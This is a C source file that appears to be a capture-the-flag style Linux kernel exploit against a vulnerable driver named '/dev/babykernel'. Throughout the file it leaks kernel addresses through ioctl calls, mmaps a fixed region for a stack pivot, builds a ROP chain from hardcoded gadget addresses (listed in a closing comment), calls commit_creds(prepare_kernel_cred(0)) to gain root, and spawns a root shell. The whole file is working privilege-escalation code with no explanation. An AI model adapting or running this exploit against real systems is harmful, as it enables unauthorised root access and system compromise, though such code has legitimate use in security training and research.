#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

void *(*prepare_kernel_cred)(void *);
int (*commit_creds)(void *);
uint64_t ops;
struct trap_frame{
	uint64_t rip;
	uint64_t cs;
	uint64_t rflags;
	uint64_t rsp;
	uint64_t ss;
}__attribute__((packed));

struct trap_frame tf;

void shell() {
    system("/bin/sh");
    perror("system");
}

void exploit()
{
	commit_creds(prepare_kernel_cred(0));
    	asm(
        "mov %%rsp, %0;"
        "swapgs;" // order of setting rsp is not matter. only care about [gs]
        "iretq;"
        : : "r" (&tf));
}
uint64_t user_cs, user_ss, user_rflags, user_sp;
void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax");
    puts("[+] Saved state");
}
int main(int argc, char *argv[]) {
    save_state();
    unsigned long long buf[0x2000];
    uint64_t *rop, *pivot, trampoline;
    unsigned long long leak[10], op[2], base;
    printf("%p\n", &buf);
    int fd = open("/dev/babykernel", O_RDONLY);
    int io;
    memset(buf, 0, sizeof(buf));
    if (fd < 0) perror("read");

    buf[0] = &leak;
    buf[1] = 32 + 8 * 100;

    buf[0] = &leak;
    buf[1] = 16;
    io = ioctl(fd, 0x1001, &buf); printf("%d\n", io);
    commit_creds = leak[0];
    prepare_kernel_cred = (uint64_t)commit_creds - 0xffffffff810fc0f0 + 0xffffffff810fc3d0;
    printf("leak[1]: %p\n", leak[1]);
    printf("commit_creds: %p\n", commit_creds);
    printf("prepare_kernel_cred: %p\n", prepare_kernel_cred);

    buf[0] = &op;
    buf[1] = 16;
    buf[2] = 0;
    io = ioctl(fd, 0x1002, &buf);
    
    printf("&ops: %p\n", op[0]);
    printf("&ops: %p\n", op[1]);
    ops = op[0];
    base = ops - 0x000000000000D60;
    printf("&base: %p\n", base);

    uint64_t addr = mmap(0x39000000-0x1000, 0x10000, PROT_READ|PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0 );
    ((char*)addr)[0] = 1;
    printf("mmaped region: %p\n", addr);
    int i = 0;
    pivot = addr + 0x1000;
    pivot[i++] = prepare_kernel_cred;
    pivot[i++] = 0xffffffff811c4203; // (1) pop rcx ; ret 
    trampoline = 0xffffffff811ad858; // (3) pop rdi ; ret 
    pivot[i++] = &trampoline;
    pivot[i++] = 0xffffffff814b492d; // (2) push rax ; jmp qword [rcx]
    pivot[i++] = commit_creds;
    pivot[i++] = 0xffffffff820010f0+0x36;
    pivot[i++] = 0;
    pivot[i++] = 0;
    pivot[i++] = &shell;
    pivot[i++] = user_cs;
    pivot[i++] = user_rflags;
    pivot[i++] = user_sp;
    pivot[i++] = user_ss;
    pivot[i++] = 0;
    pivot[i++] = 0;
    pivot[i++] = 0xdeadbeef;
    pivot[i++] = 0xdeadbeef;
    pivot[i++] = 0xdeadbeef;
    pivot[i++] = 0xdeadbeef;
    pivot[i++] = 0xdeadbeef;
    pivot[i++] = 0xdeadbeef;
    pivot[i++] = 0xdeadbeef;
    pivot[i++] = 0xdeadbeef;

    buf[0x1000] = 0xcafecafe; // kernel
    buf[0x1002] = (-ops+(unsigned long long)0xffffffff81a94128) / 8; // rip only multiple of 8
    rop = (uint64_t*)((uint64_t)&buf[0x1000]-0x7D);
    
    rop[0] = 0xffffffff81c671fa ; // rip fully control
    io = ioctl(fd, 0x1003, &buf[0x1000]);

    

    printf("LETS GO\n");
    system("/bin/sh");
}
/*
0xffffffff820010f0 T swapgs_restore_regs_and_return_to_usermode
0xffffffff8191b5b0: mov esp, 0x83FF7B54 ; ret ; (1 found) VVV
0xffffffff826d997b: mov esp, 0xD563CA60 ; ret ; (1 found)

0xffffffff82669b71: mov esp, 0x63F57968 ; ret ; (1 found)
0xffffffff81c671fa: mov esp, 0x39000000 ; ret ; (1 found)


0xffffffff82f2f680: pop rdi ; ret ; (1 found)
0xffffffff81a9cc42: push rax ; pop rdi ; call qword [rbp+0x48] ; (1 found)
0xffffffff811c9152: mov ebp, esp ; call qword [rbp+0x48] ; (1 found)

0xffffffff82641227 : adc dword ptr [rdx + rbx*2 + 0x53], edx ; push rsp ; pop rdi ; xchg bp, ax ; ret 0x6548
0xffffffff829511de : add al, byte ptr [rax] ; push rax ; pop rsi ; sub edi, edi ; ret

0xffffffff82cb9740:  xchg   rdi,rax; retf
0xffffffff8165c57a

0xffffffff82927251: push rax ; jmp qword [r14] ; (1 found)
0xffffffff814b492d: push rax ; jmp qword [rcx] ; (1 found)
0xffffffff811c4203: pop rcx ; ret ; (1 found)
0xffffffff811ad858: pop rdi ; ret ; (1 found)

*/
